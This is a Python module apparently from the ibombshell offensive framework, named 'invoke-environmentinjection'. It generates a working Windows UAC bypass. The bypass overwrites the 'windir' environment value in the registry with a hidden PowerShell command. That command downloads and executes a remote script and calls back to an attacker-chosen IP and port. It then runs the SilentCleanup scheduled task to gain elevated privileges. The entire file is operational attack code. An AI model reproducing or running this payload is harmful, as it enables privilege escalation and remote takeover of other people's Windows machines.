from termcolor import colored, cprint
from module import Module


class CustomModule(Module):
    def __init__(self):
        information = {"Name": "invoke-environmentinjection",
                       "Description": "UAC bypass environment injection",
                       "Author": "@pablogonzalezpe",
                       "Module": "@pablogonzalezpe, @toolsprods"}

        # -----------name-----default_value--description--required?
        options = {"warrior": [None, "Warrior in war", True],
                   "ip": [None, "Remote machine IP", True],
                   "port": [None, "Remote machine port", True],}

        # Constructor of the parent class
        super(CustomModule, self).__init__(information, options)

    # This module must be always implemented, it is called by the run option
    def run_module(self):
        function = """function invoke-environmentinjection{{
  
  $path = 'hkcu:\environment'

  #check if exist hkcu:\environment
  $properties = Get-ItemProperty -Path $path -Name 'windir' -ErrorAction SilentlyContinue
  if ($properties)
  {{
      Remove-ItemProperty -Path $path -Name 'windir'
  }}

    #Create windir injection
    New-ItemProperty -Name 'windir' -Path 'hkcu:\environment' -Value "cmd /K c:\windows\system32\windowspowershell\\v1.0\powershell.exe -W Hidden -C ""iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Telefonica/ibombshell/master/console');console -silently -uriconsole http://{}:{}"" && REM "

    #Task (high integrity)
    schtasks /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I

}}
""".format(self.args["ip"], self.args["port"])
            
        function += 'invoke-environmentinjection'

        super(CustomModule, self).run(function)
